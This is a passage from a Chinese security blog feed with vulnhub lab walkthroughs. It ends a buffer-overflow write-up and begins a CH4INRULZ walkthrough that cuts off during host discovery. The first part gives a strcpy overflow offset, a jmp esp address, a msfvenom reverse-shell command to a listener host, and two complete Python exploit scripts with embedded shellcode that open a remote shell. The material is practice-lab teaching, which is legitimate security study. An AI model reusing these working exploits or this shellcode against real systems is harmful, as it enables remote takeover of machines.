punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">127</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token function">f3</span><span class="token punctuation">(</span>Dest<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token function">memset</span><span class="token punctuation">(</span>Dest<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token function">closesocket</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        <span class="token function">closesocket</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里会对输入的字符串进行一些处理，然后经过一个 f3 函数，内容如下，使用 strcpy 函数将输入的数据复制到另一个字符串中</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>char <span class="token operator">*</span>__cdecl <span class="token function">f3</span><span class="token punctuation">(</span>char <span class="token operator">*</span>Source<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  char Dest<span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-76Ah]</span></pre></td></tr><tr><td data-num="4"></td><td><pre> </pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>预留的 1898 (0x76A) 个字节 + 保存 ebp 的 4 个字节，一共 1902 个字节就到返回地址，再找一个 jmp esp 语句的地址覆盖原先的地址，然后填入 shellcode，到时候执行完 strcpy 就会从栈顶执行 shellcode 代码</p>
<p>先找到 jmp esp 语句，access.exe 程序中未找到，但是 dll 动态链接库中有许多，找到两处：0x625012D0 和 0x625012DD，都可以</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011231028235-484510563.png" alt="" /></p>
<p>然后使用 msf 生成 shellcode 代码（这个根据自己的 ip 进行修改），-b 参数跟的是避免出现的字符，就是前面代码中会处理输入中的那些字符</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>shell_reverse_tcp <span class="token constant">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.75</span><span class="token number">.13</span> <span class="token constant">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>b <span class="token string single-quoted-string">'\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f'</span> <span class="token operator">-</span>f python</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011231046827-1790777700.png" alt="" /></p>
<p>最终代码分为两种，想运行简单选用第二种</p>
<p>一种是用 pwntools 库写的</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># coding:utf8</span></pre></td></tr><tr><td data-num="2"></td><td><pre> </pre></td></tr><tr><td data-num="3"></td><td><pre>from pwn import  <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre> </pre></td></tr><tr><td data-num="5"></td><td><pre>conn <span class="token operator">=</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.75.18'</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre> </pre></td></tr><tr><td data-num="7"></td><td><pre>junk <span class="token operator">=</span> b<span class="token string single-quoted-string">'a'</span> <span class="token operator">*</span> <span class="token number">1902</span></pre></td></tr><tr><td data-num="8"></td><td><pre>ret_addr<span class="token operator">=</span>b<span class="token string single-quoted-string">'\xdd\x12\x50\x62'</span></pre></td></tr><tr><td data-num="9"></td><td><pre> </pre></td></tr><tr><td data-num="10"></td><td><pre>buf <span class="token operator">=</span>  b<span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="11"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></pre></td></tr><tr><td data-num="12"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x76\x0e\x7d\xaf\x3e\xe6\x83\xee\xfc\xe2\xf4\x81\x47"</span></pre></td></tr><tr><td data-num="13"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\xe6\x7d\xaf\x5e\x6f\x98\x9e\xfe\x82\xf6\xff\x0e"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x6d\x2f\xa3\xb5\xb4\x69\x24\x4c\xce\x72\x18\x74\xc0"</span></pre></td></tr><tr><td data-num="15"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x4c\x50\x92\xda\x1c\xd3\x3c\xca\x5d\x6e\xf1\xeb\x7c"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xdc\x14\x2f\xf8\xb5\xb4\x6d\x24\x74\xda\xf6\xe3"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2f\x9e\x9e\xe7\x3f\x37\x2c\x24\x67\xc6\x7c\x7c\xb5"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xaf\x65\x4c\x04\xaf\xf6\x9b\xb5\xe7\xab\x9e\xc1\x4a"</span></pre></td></tr><tr><td data-num="19"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\x60\x33\xe7\xba\x97\xde\x93\x8b\xac\x43\x1e\x46"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd2\x1a\x93\x99\xf7\xb5\xbe\x59\xae\xed\x80\xf6\xa3"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x75\x6d\x25\xb3\x3f\x35\xf6\xab\xb5\xe7\xad\x26\x7a"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc2\x59\xf4\x65\x87\x24\xf5\x6f\x19\x9d\xf0\x61\xbc"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xf6\xbd\xd5\x6b\x20\xc7\x0d\xd4\x7d\xaf\x56\x91\x0e"</span></pre></td></tr><tr><td data-num="24"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x9d\x61\xb2\x15\xe3\x49\xc0\x7a\x50\xeb\x5e\xed\xae"</span></pre></td></tr><tr><td data-num="25"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x3e\xe6\x54\x6b\x6a\xb6\x15\x86\xbe\x8d\x7d\x50\xeb"</span></pre></td></tr><tr><td data-num="26"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xb6\x2d\xff\x6e\xa6\x2d\xef\x6e\x8e\x97\xa0\xe1\x06"</span></pre></td></tr><tr><td data-num="27"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x82\x7a\xa9\x8c\x78\xc7\xfe\x4e\x36\xa2\x56\xe4\x7d"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbe\x62\x6f\x9b\xc5\x2e\xb0\x2a\xc7\xa7\x43\x09\xce"</span></pre></td></tr><tr><td data-num="29"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc1\x33\xf8\x6f\x4a\xea\x82\xe1\x36\x93\x91\xc7\xce"</span></pre></td></tr><tr><td data-num="30"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x53\xdf\xf9\xc1\x33\x15\xcc\x53\x82\x7d\x26\xdd\xb1"</span></pre></td></tr><tr><td data-num="31"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2a\xf8\x0f\x10\x17\xbd\x67\xb0\x9f\x52\x58\x21\x39"</span></pre></td></tr><tr><td data-num="32"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x8b\x02\xe7\x7c\x22\x7a\xc2\x6d\x69\x3e\xa2\x29\xff"</span></pre></td></tr><tr><td data-num="33"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xb0\x2b\xe9\x68\xa8\x2b\xf9\x6d\xb0\x15\xd6\xf2"</span></pre></td></tr><tr><td data-num="34"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd9\xfb\x50\xeb\x6f\x9d\xe1\x68\xa0\x82\x9f\x56\xee"</span></pre></td></tr><tr><td data-num="35"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xfa\xb2\x5e\x19\xa8\x14\xce\x53\xdf\xf9\x56\x40\xe8"</span></pre></td></tr><tr><td data-num="36"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x12\xa3\x19\xa8\x93\x38\x9a\x77\x2f\xc5\x06\x08\xaa"</span></pre></td></tr><tr><td data-num="37"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x85\xa1\x6e\xdd\x51\x8c\x7d\xfc\xc1\x33"</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    </pre></td></tr><tr><td data-num="39"></td><td><pre>payload <span class="token operator">=</span> b<span class="token string single-quoted-string">''</span></pre></td></tr><tr><td data-num="40"></td><td><pre>payload <span class="token operator">+=</span> junk</pre></td></tr><tr><td data-num="41"></td><td><pre>payload <span class="token operator">+=</span> ret_addr</pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">#payload += nops</span></pre></td></tr><tr><td data-num="43"></td><td><pre>payload <span class="token operator">+=</span> buf</pre></td></tr><tr><td data-num="44"></td><td><pre> </pre></td></tr><tr><td data-num="45"></td><td><pre>conn<span class="token operator">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr></table></figure><p>一种是用 python3 的 socket 库</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num="2"></td><td><pre>import socket</pre></td></tr><tr><td data-num="3"></td><td><pre>buf<span class="token operator">=</span>b<span class="token string single-quoted-string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre>target_ip<span class="token operator">=</span><span class="token string single-quoted-string">'192.168.75.18'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>target_port<span class="token operator">=</span><span class="token number">23</span></pre></td></tr><tr><td data-num="6"></td><td><pre>recv_buf<span class="token operator">=</span><span class="token number">4096</span></pre></td></tr><tr><td data-num="7"></td><td><pre>junk <span class="token operator">=</span> b<span class="token string single-quoted-string">'a'</span> <span class="token operator">*</span> <span class="token number">1902</span></pre></td></tr><tr><td data-num="8"></td><td><pre>ret_addr<span class="token operator">=</span>b<span class="token string single-quoted-string">'\xdd\x12\x50\x62'</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#nops=b'\x90'*32   可选</span></pre></td></tr><tr><td data-num="10"></td><td><pre>buf <span class="token operator">=</span>  b<span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="11"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></pre></td></tr><tr><td data-num="12"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x76\x0e\x7d\xaf\x3e\xe6\x83\xee\xfc\xe2\xf4\x81\x47"</span></pre></td></tr><tr><td data-num="13"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\xe6\x7d\xaf\x5e\x6f\x98\x9e\xfe\x82\xf6\xff\x0e"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x6d\x2f\xa3\xb5\xb4\x69\x24\x4c\xce\x72\x18\x74\xc0"</span></pre></td></tr><tr><td data-num="15"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x4c\x50\x92\xda\x1c\xd3\x3c\xca\x5d\x6e\xf1\xeb\x7c"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xdc\x14\x2f\xf8\xb5\xb4\x6d\x24\x74\xda\xf6\xe3"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2f\x9e\x9e\xe7\x3f\x37\x2c\x24\x67\xc6\x7c\x7c\xb5"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xaf\x65\x4c\x04\xaf\xf6\x9b\xb5\xe7\xab\x9e\xc1\x4a"</span></pre></td></tr><tr><td data-num="19"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbc\x60\x33\xe7\xba\x97\xde\x93\x8b\xac\x43\x1e\x46"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd2\x1a\x93\x99\xf7\xb5\xbe\x59\xae\xed\x80\xf6\xa3"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x75\x6d\x25\xb3\x3f\x35\xf6\xab\xb5\xe7\xad\x26\x7a"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc2\x59\xf4\x65\x87\x24\xf5\x6f\x19\x9d\xf0\x61\xbc"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xf6\xbd\xd5\x6b\x20\xc7\x0d\xd4\x7d\xaf\x56\x91\x0e"</span></pre></td></tr><tr><td data-num="24"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x9d\x61\xb2\x15\xe3\x49\xc0\x7a\x50\xeb\x5e\xed\xae"</span></pre></td></tr><tr><td data-num="25"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x3e\xe6\x54\x6b\x6a\xb6\x15\x86\xbe\x8d\x7d\x50\xeb"</span></pre></td></tr><tr><td data-num="26"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xb6\x2d\xff\x6e\xa6\x2d\xef\x6e\x8e\x97\xa0\xe1\x06"</span></pre></td></tr><tr><td data-num="27"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x82\x7a\xa9\x8c\x78\xc7\xfe\x4e\x36\xa2\x56\xe4\x7d"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbe\x62\x6f\x9b\xc5\x2e\xb0\x2a\xc7\xa7\x43\x09\xce"</span></pre></td></tr><tr><td data-num="29"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc1\x33\xf8\x6f\x4a\xea\x82\xe1\x36\x93\x91\xc7\xce"</span></pre></td></tr><tr><td data-num="30"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x53\xdf\xf9\xc1\x33\x15\xcc\x53\x82\x7d\x26\xdd\xb1"</span></pre></td></tr><tr><td data-num="31"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2a\xf8\x0f\x10\x17\xbd\x67\xb0\x9f\x52\x58\x21\x39"</span></pre></td></tr><tr><td data-num="32"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x8b\x02\xe7\x7c\x22\x7a\xc2\x6d\x69\x3e\xa2\x29\xff"</span></pre></td></tr><tr><td data-num="33"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xb0\x2b\xe9\x68\xa8\x2b\xf9\x6d\xb0\x15\xd6\xf2"</span></pre></td></tr><tr><td data-num="34"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd9\xfb\x50\xeb\x6f\x9d\xe1\x68\xa0\x82\x9f\x56\xee"</span></pre></td></tr><tr><td data-num="35"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xfa\xb2\x5e\x19\xa8\x14\xce\x53\xdf\xf9\x56\x40\xe8"</span></pre></td></tr><tr><td data-num="36"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x12\xa3\x19\xa8\x93\x38\x9a\x77\x2f\xc5\x06\x08\xaa"</span></pre></td></tr><tr><td data-num="37"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x85\xa1\x6e\xdd\x51\x8c\x7d\xfc\xc1\x33"</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    </pre></td></tr><tr><td data-num="39"></td><td><pre>payload <span class="token operator">=</span> b<span class="token string single-quoted-string">''</span></pre></td></tr><tr><td data-num="40"></td><td><pre>payload <span class="token operator">+=</span> junk</pre></td></tr><tr><td data-num="41"></td><td><pre>payload <span class="token operator">+=</span> ret_addr</pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">#payload += nops</span></pre></td></tr><tr><td data-num="43"></td><td><pre>payload <span class="token operator">+=</span> buf</pre></td></tr><tr><td data-num="44"></td><td><pre>with socket<span class="token operator">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token operator">.</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span>socket<span class="token operator">.</span><span class="token constant">SOCK_STREAM</span><span class="token punctuation">)</span> <span class="token keyword">as</span> clientSock<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    clientSock<span class="token operator">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span>target_port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    data_from_srv <span class="token operator">=</span> clientSock<span class="token operator">.</span><span class="token function">recv</span><span class="token punctuation">(</span>recv_buf<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string double-quoted-string">"Reply --> &#123;data_from_srv&#125;"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string double-quoted-string">"Sending --> &#123;payload&#125;"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    clientSock<span class="token operator">.</span><span class="token function">sendall</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr></table></figure><p>本地开启监听 4444 端口，运行脚本，拿到最终 flag</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011231104426-75811449.png" alt="" /></p>
<p><span class="exturl" data-url="aHR0cDovL3Z4ZXIuY24vP2lkPTU=">大佬链接</span></p>
]]></content>
      <categories>
        <category>vulnhub靶机实战</category>
      </categories>
      <tags>
        <tag>vulnhub靶机实战</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶场实战-CH4INRULZ_v1.0.1</title>
    <url>/article/3f0418ee.html</url>
    <content><![CDATA[<h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2>
<p>靶机下载地址:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span>entry<span class="token operator">/</span>ch4inrulz<span class="token operator">-</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">247</span><span class="token operator">/</span></pre></td></tr></table></figure><p>靶机说明：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Frank has a small website and he is a smart developer <span class="token keyword">with</span> a normal security background <span class="token punctuation">,</span> he always love to follow patterns <span class="token punctuation">,</span> your goal is to discover any critical vulnerabilities and gain access to the system <span class="token punctuation">,</span> then you need to gain root access <span class="token keyword">in</span> order to capture the root flag<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>This machine was made <span class="token keyword">for</span> Jordan’s Top hacker <span class="token number">2018</span> <span class="token constant">CTF</span> <span class="token punctuation">,</span> we tried to make it simulate a real world attacks <span class="token keyword">in</span> order to improve your penetration testing skills<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>The machine was tested on <span class="token function">vmware</span> <span class="token punctuation">(</span>player <span class="token operator">/</span> workstation<span class="token punctuation">)</span> and works without any problems <span class="token punctuation">,</span> so we recommend to use VMware to run it <span class="token punctuation">,</span> Also works fine using virtualbox<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">Difficulty</span><span class="token operator">:</span> Intermediate <span class="token punctuation">,</span> you need to think out <span class="token keyword">of</span> the box and collect all the puzzle pieces <span class="token keyword">in</span> order to <span class="token keyword">get</span> the job done<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>The machine is already got <span class="token constant">DHCP</span> enabled <span class="token punctuation">,</span> so you will not have any problems <span class="token keyword">with</span> networking<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>Happy Hacking <span class="token operator">!</span></pre></td></tr></table></figure><h2 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h2>
<p>这里使用 <code>VM workstation</code>  和 <code>VM VirtualBox</code>  进行演练</p>
<p>为了正常练习，将靶场的网卡模式设置为桥接模式，启动即可</p>
<h2 id="主机发现"><a class="anchor" href="#主机发现">#</a> 主机发现</h2>
<p>查看本机 IP：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>root@kali<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# ifconfig</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">docker0</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">4099</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">BROADCAST</span><span class="token punctuation">,</span><span class="token constant">MULTICAST</span><span class="token operator">></span>  mtu <span class="token number">1500</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        inet <span class="token number">172.17</span><span class="token number">.0</span><span class="token number">.1</span>  netmask <span class="token number">255.255</span><span class="token number">.0</span><span class="token number">.0</span>  broadcast <span class="token number">172.17</span><span class="token number">.255</span><span class="token number">.255</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        ether <span class="token number">02</span><span class="token operator">:</span><span class="token number">42</span><span class="token operator">:</span>8e<span class="token operator">:</span><span class="token number">77</span><span class="token operator">:</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">02</span>  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> <span class="token constant">B</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> <span class="token constant">B</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">eth0</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">4163</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">BROADCAST</span><span class="token punctuation">,</span><span class="token constant">RUNNING</span><span class="token punctuation">,</span><span class="token constant">MULTICAST</span><span class="token operator">></span>  mtu <span class="token number">1500</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        inet <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span>  netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span>  broadcast <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.255</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        inet6 fe80<span class="token operator">:</span><span class="token operator">:</span>20c<span class="token operator">:</span>29ff<span class="token operator">:</span>fedc<span class="token operator">:</span><span class="token number">3789</span>  prefixlen <span class="token number">64</span>  scopeid <span class="token number">0x20</span><span class="token operator">&lt;</span>link<span class="token operator">></span></pre></td></tr><tr><td data-num="13"></td><td><pre>        ether <span class="token number">00</span><span class="token operator">:</span>0c<span class="token operator">:</span><span class="token number">29</span><span class="token operator">:</span>dc<span class="token operator">:</span><span class="token number">37</span><span class="token operator">:</span><span class="token number">89</span>  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">23392</span>  bytes <span class="token number">23815386</span> <span class="token punctuation">(</span><span class="token number">22.7</span> MiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td 